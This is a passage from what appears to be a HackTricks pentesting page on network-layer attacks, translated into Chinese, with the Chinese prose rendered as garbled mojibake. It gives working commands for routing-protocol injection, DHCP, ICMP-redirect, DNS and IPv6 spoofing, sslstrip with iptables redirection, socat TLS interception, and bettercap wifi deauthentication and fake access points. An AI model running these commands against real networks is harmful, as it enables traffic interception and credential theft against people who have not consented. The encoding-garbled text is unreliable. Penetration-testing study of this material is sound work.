**FHRP**ï¼ˆç¬¬ä¸€è·³å†—ä½™åè®®ï¼‰æ˜¯ä¸€ç±»æ—¨åœ¨**åˆ›å»ºçƒ­å¤‡ä»½è·¯ç”±ç³»ç»Ÿ**çš„ç½‘ç»œåè®®ã€‚é€šè¿‡FHRPï¼Œç‰©ç†è·¯ç”±å™¨å¯ä»¥ç»„åˆæˆå•ä¸ªé€»è¾‘è®¾å¤‡ï¼Œæé«˜å®¹é”™èƒ½åŠ›å¹¶å¸®åŠ©åˆ†æ‹…è´Ÿè½½ã€‚

**æ€ç§‘ç³»ç»Ÿå·¥ç¨‹å¸ˆå¼€å‘äº†ä¸¤ç§FHRPåè®®ï¼ŒGLBPå’ŒHSRPã€‚**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

è·¯ç”±ä¿¡æ¯åè®®ï¼ˆRIPï¼‰å­˜åœ¨ä¸‰ä¸ªç‰ˆæœ¬â€”RIPã€RIPv2å’ŒRIPngã€‚RIPå’ŒRIPv2ä½¿ç”¨UDPæ•°æ®æŠ¥é€šè¿‡ç«¯å£520å‘é€åˆ°å¯¹ç­‰æ–¹ï¼Œè€ŒRIPngé€šè¿‡IPv6ç»„æ’­å‘UDPç«¯å£521å¹¿æ’­æ•°æ®æŠ¥ã€‚RIPv2å¼•å…¥äº†MD5è®¤è¯æ”¯æŒã€‚RIPngä¸åŒ…å«åŸç”Ÿè®¤è¯ï¼›ç›¸åï¼Œå®ƒä¾èµ–äºIPv6ä¸­çš„å¯é€‰IPsec AHå’ŒESPå¤´éƒ¨ã€‚

è¦äº†è§£å¦‚ä½•æ”»å‡»æ­¤åè®®çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ä¹¦ç±_**ã€Šç½‘ç»œå®‰å…¨è¯„ä¼°ï¼šäº†è§£æ‚¨çš„ç½‘ç»œï¼ˆç¬¬3ç‰ˆï¼‰ã€‹**_ã€‚

### EIGRPæ”»å‡»

**EIGRPï¼ˆå¢å¼ºå†…éƒ¨ç½‘å…³è·¯ç”±åè®®ï¼‰**æ˜¯ä¸€ç§åŠ¨æ€è·¯ç”±åè®®ã€‚**å®ƒæ˜¯ä¸€ç§è·ç¦»çŸ¢é‡åè®®ã€‚**å¦‚æœ**æ²¡æœ‰è®¤è¯**å’Œè¢«åŠ¨æ¥å£é…ç½®ï¼Œ**å…¥ä¾µè€…**å¯ä»¥å¹²æ‰°EIGRPè·¯ç”±å¹¶å¯¼è‡´**è·¯ç”±è¡¨æ±¡æŸ“**ã€‚æ­¤å¤–ï¼ŒEIGRPç½‘ç»œï¼ˆæ¢å¥è¯è¯´ï¼Œè‡ªæ²»ç³»ç»Ÿï¼‰**æ˜¯å¹³é¢çš„ï¼Œæ²¡æœ‰åˆ†æ®µæˆä»»ä½•åŒºåŸŸ**ã€‚å¦‚æœ**æ”»å‡»è€…æ³¨å…¥ä¸€æ¡è·¯ç”±**ï¼Œè¿™æ¡è·¯ç”±å¾ˆå¯èƒ½ä¼š**ä¼ æ’­**åˆ°æ•´ä¸ªè‡ªæ²»ç³»ç»Ÿçš„EIGRPç³»ç»Ÿä¸­ã€‚

è¦æ”»å‡»EIGRPç³»ç»Ÿéœ€è¦**ä¸åˆæ³•çš„EIGRPè·¯ç”±å™¨å»ºç«‹é‚»å±…å…³ç³»**ï¼Œè¿™å°†æ‰“å¼€è®¸å¤šå¯èƒ½æ€§ï¼Œä»åŸºæœ¬çš„ä¾¦å¯Ÿåˆ°å„ç§æ³¨å…¥ã€‚

\*\*\*\*[**FRRouting**](https://frrouting.org/)å…è®¸æ‚¨å®ç°**æ”¯æŒBGPã€OSPFã€EIGRPã€RIPå’Œå…¶ä»–åè®®çš„è™šæ‹Ÿè·¯ç”±å™¨**ã€‚æ‚¨åªéœ€åœ¨æ”»å‡»è€…ç³»ç»Ÿä¸Šéƒ¨ç½²å®ƒï¼Œå®é™…ä¸Šå°±å¯ä»¥å‡è£…æˆè·¯ç”±åŸŸä¸­çš„åˆæ³•è·¯ç”±å™¨ã€‚

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/)è¿˜æ”¯æŒæ•è·EIGRPå¹¿æ’­å¹¶æ³¨å…¥æ•°æ®åŒ…ä»¥æ“çºµè·¯ç”±é…ç½®ã€‚æœ‰å…³å¦‚ä½•ä½¿ç”¨Colyæ”»å‡»çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹_**ã€Šç½‘ç»œå®‰å…¨è¯„ä¼°ï¼šäº†è§£æ‚¨çš„ç½‘ç»œï¼ˆç¬¬3ç‰ˆï¼‰ã€‹**_ã€‚

### OSPF

å¤§å¤šæ•°Open Shortest Path Firstï¼ˆOSPFï¼‰å®ç°ä½¿ç”¨MD5æä¾›è·¯ç”±å™¨ä¹‹é—´çš„è®¤è¯ã€‚Lokiå’ŒJohn the Ripperå¯ä»¥æ•è·å’Œæ”»å‡»MD5å“ˆå¸Œä»¥æ­ç¤ºå¯†é’¥ï¼Œç„¶åå¯ä»¥ç”¨äºå¹¿å‘Šæ–°è·¯ç”±ã€‚é€šè¿‡ä½¿ç”¨_æ³¨å…¥_é€‰é¡¹å¡è®¾ç½®è·¯ç”±å‚æ•°ï¼Œå¹¶åœ¨_è¿æ¥_ä¸‹è®¾ç½®å¯†é’¥ã€‚

è¦äº†è§£å¦‚ä½•æ”»å‡»æ­¤åè®®çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ä¹¦ç±_**ã€Šç½‘ç»œå®‰å…¨è¯„ä¼°ï¼šäº†è§£æ‚¨çš„ç½‘ç»œï¼ˆç¬¬3ç‰ˆï¼‰ã€‹**_ã€‚

### å…¶ä»–é€šç”¨å·¥å…·å’Œèµ„æº

* [**Above**](https://github.com/c4s73r/Above)ï¼šç”¨äºæ‰«æç½‘ç»œæµé‡å¹¶æŸ¥æ‰¾æ¼æ´çš„å·¥å…·
* æ‚¨å¯ä»¥åœ¨[æ­¤å¤„](https://github.com/Sab0tag3d/MITM-cheatsheet)æ‰¾åˆ°æœ‰å…³ç½‘ç»œæ”»å‡»çš„æ›´å¤šä¿¡æ¯ã€‚_ï¼ˆå¾…åŠäº‹é¡¹ï¼šé˜…è¯»æ‰€æœ‰å†…å®¹ä»¥åŠä»»ä½•æ–°æ”»å‡»ï¼‰_

## **æ¬ºéª—**

æ”»å‡»è€…é…ç½®æ‰€æœ‰ç½‘ç»œå‚æ•°ï¼ˆç½‘å…³ã€IPã€DNSï¼‰ä¸ºå‘é€è™šå‡DHCPå“åº”çš„ç½‘ç»œæ–°æˆå‘˜ã€‚
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARPæ¬ºéª—

æŸ¥çœ‹[å‰ä¸€èŠ‚](./#arp-spoofing)ã€‚

### ICMPé‡å®šå‘

ICMPé‡å®šå‘æ˜¯æŒ‡å‘é€ä¸€ç§ICMPæ•°æ®åŒ…ï¼Œç±»å‹ä¸º1ï¼Œä»£ç ä¸º5ï¼Œè¡¨æ˜æ”»å‡»è€…æ˜¯åˆ°è¾¾æŸä¸ªIPåœ°å€çš„æœ€ä½³è·¯å¾„ã€‚ç„¶åï¼Œå½“å—å®³è€…æƒ³è¦è”ç³»è¯¥IPåœ°å€æ—¶ï¼Œæ•°æ®åŒ…ä¼šé€šè¿‡æ”»å‡»è€…å‘é€ã€‚
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNSæ¬ºéª—

æ”»å‡»è€…å°†è§£æå—å®³è€…è¯·æ±‚çš„ä¸€äº›ï¼ˆæˆ–å…¨éƒ¨ï¼‰åŸŸåã€‚
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**ä½¿ç”¨dnsmasqé…ç½®è‡ªå·±çš„DNS**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### æœ¬åœ°ç½‘å…³

é€šå¸¸å­˜åœ¨åˆ°ç³»ç»Ÿå’Œç½‘ç»œçš„å¤šæ¡è·¯ç”±ã€‚åœ¨æ„å»ºæœ¬åœ°ç½‘ç»œä¸­çš„MACåœ°å€åˆ—è¡¨åï¼Œä½¿ç”¨ _gateway-finder.py_ æ¥è¯†åˆ«æ”¯æŒIPv4è½¬å‘çš„ä¸»æœºã€‚
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [æ¬ºéª— LLMNRã€NBT-NS å’Œ mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Microsoft ç³»ç»Ÿä½¿ç”¨ Link-Local Multicast Name Resolution (LLMNR) å’Œ NetBIOS Name Service (NBT-NS) æ¥è¿›è¡Œæœ¬åœ°ä¸»æœºè§£æï¼Œå½“ DNS æŸ¥è¯¢å¤±è´¥æ—¶ã€‚Apple Bonjour å’Œ Linux é›¶é…ç½®å®ç°ä½¿ç”¨ Multicast DNS (mDNS) æ¥å‘ç°ç½‘ç»œä¸­çš„ç³»ç»Ÿã€‚è¿™äº›åè®®æœªç»èº«ä»½éªŒè¯ï¼Œé€šè¿‡ UDP å¹¿æ’­æ¶ˆæ¯ï¼›å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒä»¬å°†ç”¨æˆ·å¼•å¯¼åˆ°æ¶æ„æœåŠ¡ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ Responder æ¨¡æ‹Ÿè¢«ä¸»æœºæœç´¢çš„æœåŠ¡ï¼Œå‘é€è™šå‡å“åº”ã€‚\
é˜…è¯»æœ‰å…³[å¦‚ä½•ä½¿ç”¨ Responder æ¨¡æ‹ŸæœåŠ¡](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)çš„æ›´å¤šä¿¡æ¯ã€‚

### [æ¬ºéª— WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

è®¸å¤šæµè§ˆå™¨ä½¿ç”¨ Web Proxy Auto-Discovery (WPAD) ä»ç½‘ç»œåŠ è½½ä»£ç†è®¾ç½®ã€‚WPAD æœåŠ¡å™¨é€šè¿‡ç‰¹å®š URLï¼ˆä¾‹å¦‚ï¼Œ[http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)ï¼‰æä¾›å®¢æˆ·ç«¯ä»£ç†è®¾ç½®ï¼Œå½“é€šè¿‡ä»¥ä¸‹ä»»ä¸€æ–¹å¼è¯†åˆ«æ—¶ï¼š

- DHCPï¼Œä½¿ç”¨ä»£ç  252 æ¡ç›®
- DNSï¼Œåœ¨æœ¬åœ°åŸŸä¸­æœç´¢ _wpad_ ä¸»æœºå
- Microsoft LLMNR å’Œ NBT-NSï¼ˆåœ¨ DNS æŸ¥è¯¢å¤±è´¥æ—¶ï¼‰

Responder è‡ªåŠ¨åŒ–äº† WPAD æ”»å‡» - è¿è¡Œä»£ç†å¹¶é€šè¿‡ DHCPã€DNSã€LLMNR å’Œ NBT-NS å°†å®¢æˆ·ç«¯å¼•å¯¼åˆ°æ¶æ„ WPAD æœåŠ¡å™¨ã€‚\
é˜…è¯»æœ‰å…³[å¦‚ä½•ä½¿ç”¨ Responder æ¨¡æ‹ŸæœåŠ¡](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)çš„æ›´å¤šä¿¡æ¯ã€‚

### [æ¬ºéª— SSDP å’Œ UPnP è®¾å¤‡](spoofing-ssdp-and-upnp-devices.md)

æ‚¨å¯ä»¥åœ¨ç½‘ç»œä¸­æä¾›ä¸åŒçš„æœåŠ¡ï¼Œè¯•å›¾**æ¬ºéª—ç”¨æˆ·**è¾“å…¥ä¸€äº›**æ˜æ–‡å‡­æ®**ã€‚æœ‰å…³æ­¤æ”»å‡»çš„**æ›´å¤šä¿¡æ¯**è¯·å‚é˜…[**æ¬ºéª— SSDP å’Œ UPnP è®¾å¤‡**](spoofing-ssdp-and-upnp-devices.md)**ã€‚**

### IPv6 é‚»å±…æ¬ºéª—

è¿™ç§æ”»å‡»ä¸ ARP æ¬ºéª—éå¸¸ç›¸ä¼¼ï¼Œä½†åœ¨ IPv6 ä¸–ç•Œä¸­ã€‚æ‚¨å¯ä»¥è®©å—å®³è€…è®¤ä¸ºç½‘å…³çš„ IPv6 å…·æœ‰æ”»å‡»è€…çš„ MAC åœ°å€ã€‚
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6è·¯ç”±å™¨é€šå‘Šæ¬ºéª—/æ´ªæ³›

ä¸€äº›æ“ä½œç³»ç»Ÿé»˜è®¤é…ç½®ä¸ºä»ç½‘ç»œä¸­å‘é€çš„RAæ•°æ®åŒ…ä¸­è·å–ç½‘å…³ã€‚è¦å°†æ”»å‡»è€…å£°æ˜ä¸ºIPv6è·¯ç”±å™¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ï¼š
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCPæ¬ºéª—

é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€äº›æ“ä½œç³»ç»Ÿå°è¯•é€šè¿‡è¯»å–ç½‘ç»œä¸­çš„DHCPv6æ•°æ®åŒ…æ¥é…ç½®DNSã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥å‘é€ä¸€ä¸ªDHCPv6æ•°æ®åŒ…æ¥å°†è‡ªå·±é…ç½®ä¸ºDNSã€‚DHCPè¿˜ä¼šä¸ºå—å®³è€…æä¾›ä¸€ä¸ªIPv6åœ°å€ã€‚
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTPï¼ˆä¼ªé€ é¡µé¢å’ŒJSä»£ç æ³¨å…¥ï¼‰

## äº’è”ç½‘æ”»å‡»

### sslStrip

åŸºæœ¬ä¸Šï¼Œè¿™ç§æ”»å‡»çš„ä½œç”¨æ˜¯ï¼Œå¦‚æœ**ç”¨æˆ·**è¯•å›¾**è®¿é—®**ä¸€ä¸ª**é‡å®šå‘åˆ°****HTTPS**ç‰ˆæœ¬çš„**HTTP**é¡µé¢ã€‚**sslStrip**å°†ä¼šä¸**å®¢æˆ·ç«¯ä¿æŒ**ä¸€ä¸ª**HTTPè¿æ¥**ï¼Œä¸**æœåŠ¡å™¨ä¿æŒ**ä¸€ä¸ª**HTTPSè¿æ¥**ï¼Œè¿™æ ·å®ƒå°±èƒ½å¤Ÿä»¥**æ˜æ–‡**æ–¹å¼**å—…æ¢**è¿æ¥ã€‚
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
æ›´å¤šä¿¡æ¯[åœ¨è¿™é‡Œ](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)ã€‚

### sslStrip+å’Œdns2proxyç”¨äºç»•è¿‡HSTS

**sslStrip+å’Œdns2proxy**ä¸**sslStrip**çš„**åŒºåˆ«**åœ¨äºï¼Œå®ƒä»¬ä¼šå°†ä¾‹å¦‚_**www.facebook.com**_ **é‡å®šå‘åˆ°**_**wwww.facebook.com**_ï¼ˆæ³¨æ„**é¢å¤–çš„**â€œ**w**â€ï¼‰ï¼Œå¹¶å°†è¯¥åŸŸçš„**åœ°å€è®¾ç½®ä¸ºæ”»å‡»è€…IP**ã€‚è¿™æ ·ï¼Œ**å®¢æˆ·ç«¯**å°†è¿æ¥åˆ°_**wwww.facebook.com**_ï¼ˆæ”»å‡»è€…ï¼‰ï¼Œä½†åœ¨å¹•å**sslstrip+**å°†é€šè¿‡httpsä¸**www.facebook.com** **ä¿æŒ**çœŸå®è¿æ¥ã€‚

è¿™ç§æŠ€æœ¯çš„**ç›®æ ‡**æ˜¯**é¿å¼€HSTS**ï¼Œå› ä¸º_**wwww**.facebook.com_ **ä¸ä¼š**ä¿å­˜åœ¨æµè§ˆå™¨çš„ç¼“å­˜ä¸­ï¼Œå› æ­¤æµè§ˆå™¨å°†è¢«æ¬ºéª—åœ¨HTTPä¸­æ‰§è¡Œ**facebookèº«ä»½éªŒè¯**ã€‚\
è¯·æ³¨æ„ï¼Œä¸ºäº†æ‰§è¡Œæ­¤æ”»å‡»ï¼Œå—å®³è€…å¿…é¡»å°è¯•æœ€åˆè®¿é—®[http://www.faceook.com](http://www.faceook.com)è€Œä¸æ˜¯httpsã€‚è¿™å¯ä»¥é€šè¿‡ä¿®æ”¹httpé¡µé¢å†…çš„é“¾æ¥æ¥å®Œæˆã€‚

æ›´å¤šä¿¡æ¯[åœ¨è¿™é‡Œ](https://www.bettercap.org/legacy/#hsts-bypass)ï¼Œ[åœ¨è¿™é‡Œ](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014)å’Œ[åœ¨è¿™é‡Œ](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)ã€‚

**sslStripæˆ–sslStrip+ä¸å†èµ·ä½œç”¨ã€‚è¿™æ˜¯å› ä¸ºæµè§ˆå™¨ä¸­é¢„å…ˆä¿å­˜äº†HSTSè§„åˆ™ï¼Œå› æ­¤å³ä½¿ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®â€œé‡è¦â€åŸŸï¼Œä¹Ÿä¼šé€šè¿‡HTTPSè®¿é—®ã€‚æ­¤å¤–ï¼Œè¯·æ³¨æ„ï¼Œé¢„å…ˆä¿å­˜çš„è§„åˆ™å’Œå…¶ä»–ç”Ÿæˆçš„è§„åˆ™å¯ä»¥ä½¿ç”¨æ ‡å¿—** [**`includeSubdomains`**](https://hstspreload.appspot.com) **å› æ­¤ï¼Œä¹‹å‰çš„** _**wwww.facebook.com**_ **ç¤ºä¾‹å°†ä¸å†èµ·ä½œç”¨ï¼Œå› ä¸º** _**facebook.com**_ **ä½¿ç”¨å¸¦æœ‰`includeSubdomains`çš„HSTSã€‚**

å¾…åŠäº‹é¡¹ï¼šeasy-credsã€evilgradeã€metasploitã€factory

## åœ¨ç«¯å£ä¸Šè¿›è¡ŒTCPç›‘å¬
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## åœ¨ç«¯å£ä¸Šè¿›è¡Œ TCP + SSL ç›‘å¬

#### ç”Ÿæˆå¯†é’¥å’Œè‡ªç­¾åè¯ä¹¦
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### ä½¿ç”¨è¯ä¹¦è¿›è¡Œç›‘å¬
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### ä½¿ç”¨è¯ä¹¦ç›‘å¬å¹¶é‡å®šå‘åˆ°ä¸»æœº
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
æœ‰æ—¶ï¼Œå¦‚æœå®¢æˆ·ç«¯æ£€æŸ¥CAæ˜¯å¦æœ‰æ•ˆï¼Œæ‚¨å¯ä»¥**æä¾›ç”±CAç­¾åçš„å…¶ä»–ä¸»æœºåçš„è¯ä¹¦**ã€‚\
å¦ä¸€ä¸ªæœ‰è¶£çš„æµ‹è¯•æ˜¯æä¾›ä¸€ä¸ª**è¯·æ±‚ä¸»æœºåçš„è¯ä¹¦ï¼Œä½†æ˜¯è‡ªç­¾åçš„**ã€‚

å…¶ä»–è¦æµ‹è¯•çš„äº‹æƒ…åŒ…æ‹¬å°è¯•ä½¿ç”¨ä¸€ä¸ªæ— æ•ˆçš„è¯ä¹¦å¯¹è¯ä¹¦è¿›è¡Œç­¾åï¼Œæˆ–è€…ä½¿ç”¨æœ‰æ•ˆçš„å…¬é’¥ï¼Œå¼ºåˆ¶ä½¿ç”¨è¯¸å¦‚è¿ªè²-èµ«å°”æ›¼ï¼ˆä¸éœ€è¦ä½¿ç”¨çœŸå®ç§é’¥è§£å¯†ä»»ä½•å†…å®¹çš„ç®—æ³•ï¼‰è¿™æ ·çš„ç®—æ³•ï¼Œå¹¶åœ¨å®¢æˆ·ç«¯è¯·æ±‚çœŸå®ç§é’¥çš„æ¢æµ‹æ—¶ï¼ˆå¦‚å“ˆå¸Œï¼‰å‘é€ä¸€ä¸ªè™šå‡çš„æ¢æµ‹ï¼Œå¹¶æœŸæœ›å®¢æˆ·ç«¯ä¸ä¼šæ£€æŸ¥è¿™ä¸€ç‚¹ã€‚

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### ä¸»åŠ¨å‘ç°ç¬”è®°

è¯·æ³¨æ„ï¼Œå½“å‘ä¸€ä¸ªæ²¡æœ‰è¯·æ±‚ç«¯å£çš„è®¾å¤‡å‘é€UDPæ•°æ®åŒ…æ—¶ï¼Œä¼šå‘é€ä¸€ä¸ªICMPï¼ˆç«¯å£ä¸å¯è¾¾ï¼‰ã€‚

### **ARP å‘ç°**

ARPæ•°æ®åŒ…ç”¨äºå‘ç°ç½‘ç»œå†…æ­£åœ¨ä½¿ç”¨çš„IPåœ°å€ã€‚è®¡ç®—æœºå¿…é¡»ä¸ºæ¯ä¸ªå¯èƒ½çš„IPåœ°å€å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œåªæœ‰æ­£åœ¨ä½¿ç”¨çš„IPåœ°å€æ‰ä¼šå“åº”ã€‚

### **mDNSï¼ˆå¤šæ’­DNSï¼‰**

Bettercapå‘é€ä¸€ä¸ªMDNSè¯·æ±‚ï¼ˆæ¯Xæ¯«ç§’ä¸€æ¬¡ï¼‰ï¼Œè¯·æ±‚ **\_services\_.dns-sd.\_udp.local**ï¼Œçœ‹åˆ°è¿™ä¸ªæ•°æ®åŒ…çš„æœºå™¨é€šå¸¸ä¼šå›åº”æ­¤è¯·æ±‚ã€‚ç„¶åï¼Œå®ƒåªæœç´¢å›åº”â€œservicesâ€çš„æœºå™¨ã€‚

**å·¥å…·**

* Avahi-browserï¼ˆ--allï¼‰
* Bettercapï¼ˆnet.probe.mdnsï¼‰
* Responder

### **NBNSï¼ˆNetBiosåç§°æœåŠ¡å™¨ï¼‰**

Bettercapå‘ç«¯å£137/UDPå¹¿æ’­æ•°æ®åŒ…ï¼Œè¯·æ±‚åç§°ä¸ºâ€œCKAAAAAAAAAAAAAAAAAAAAAAAAAAAâ€ã€‚

### **SSDPï¼ˆç®€å•æœåŠ¡å‘ç°åè®®ï¼‰**

Bettercapå¹¿æ’­SSDPæ•°æ®åŒ…ï¼Œæœç´¢å„ç§æœåŠ¡ï¼ˆUDPç«¯å£1900ï¼‰ã€‚

### **WSDï¼ˆWebæœåŠ¡å‘ç°ï¼‰**

Bettercapå¹¿æ’­WSDæ•°æ®åŒ…ï¼Œæœç´¢æœåŠ¡ï¼ˆUDPç«¯å£3702ï¼‰ã€‚

## å‚è€ƒèµ„æ–™

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**æ¼æ´èµé‡‘æç¤º**ï¼š**æ³¨å†Œ**Intigritiï¼Œä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§**æ¼æ´èµé‡‘å¹³å°**ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬ï¼Œè®©æ‚¨çš„èµé‡‘é«˜è¾¾**$100,000**ï¼[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ä¸Šå…³æ³¨**æˆ‘ä»¬ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
